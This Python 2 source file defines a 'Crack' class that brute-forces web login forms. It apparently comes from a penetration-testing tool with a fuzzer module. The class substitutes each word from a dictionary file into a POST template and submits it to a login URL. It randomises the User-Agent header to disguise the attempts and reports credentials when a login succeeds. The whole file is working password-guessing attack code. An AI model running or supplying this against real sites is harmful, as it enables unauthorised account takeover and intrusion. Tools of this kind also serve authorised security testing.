#!/usr/bin/python

import sys
import time
import random
import os
import requests
import urllib
import urllib2
from user_agent import generate_user_agent
from ui import *
from fuzzer import *


class Crack:

	"""
	Assign the session
	"""
	def set_session(self, session):
		self.session = session

	"""
	Assign the post data
	"""
	def set_postdata(self, postdata):
		if (postdata != None):
			self.postdata = postdata
		else:
			self.postdata = None

	"""
	Assign the Login URL
	"""
	def set_loginurl(self, loginurl):
		self.loginurl = loginurl	

	"""
	Login to the website
	"""		
	def bruteforce(self):
		option = raw_input("Do you want to bruteforce the password [Y/n]: ")
		if option == "n" or option == "N" or option == "No" or option == "no":
			username = raw_input("Username: ")
			password = raw_input("Password: ")
			ui = UI()
			if (self.login(username, password)):
				ui.print_text('INFO', "Successful login with %s:%s" % (username, password))
				time.sleep(5)
			else:
				ui.print_text("ERROR", "Failed Login With %s:%s" % (username, password))
				sys.exit(1)

		else:
	
			wordlist = raw_input("Enter the name of the dictionary: ")
			username = raw_input("Enter the username: ")
			while (username == ""): 			
			       username = raw_input("Enter the username: ")

			self.crack(wordlist, username)
	"""
	Returns the session
	"""
	def get_session(self):
		return self.session

	"""
	Crack the password
	"""
	def crack(self, wordlist, username):
		ui = UI()	
		if (self.postdata == None):
			ui.print_text("ERROR", "No postdata set for bruteforce")
			sys.exit(1)				
	
		if (os.path.isfile(wordlist)):
			lines = open(wordlist, 'r').readlines()
			for line in lines:
				password = line.split()[0]
				if (self.login(username, password)):
					ui.print_text('INFO', "Successful login with %s:%s" % (username, password))
					time.sleep(5)
					break
				else:
					ui.print_text("ERROR", "Attempting Login With %s:%s" % (username, password))
					time.sleep(1)

			if (self.login(username, password) == False):
				ui.print_text("ERROR", "Could not find the password, Injections may not work try a different wordlist.")
				sys.exit(1)
		else:
			ui.print_text('ERROR', "Wordlist does not exist")
			sys.exit(1)
			
		
	"""
	Attempt to login
	"""			
	def login(self, username, password):

		postusr = self.postdata.replace('^USER^', username)
		postpas = postusr.replace('^PASS^', password)
		newpost = postpas.split('&')
		formdata = []
		payload = dict()
		formdata.append( newpost[0].split('=')[0] )
		formdata.append( newpost[1].split('=')[0] )
		formdata.append( newpost[2].split('=')[0] )
		formdata.append( newpost[2].split('=')[1] )
		
		payload.update({formdata[0]:username, formdata[1]:password, formdata[2]:formdata[3]})
		headers = {'User-Agent': generate_user_agent(device_type="desktop", os=('mac', 'linux'))}

		request = self.session.post(self.loginurl, data=payload, headers=headers) 
		postusr = ""
		postpas = ""
		return 'login' not in request.url









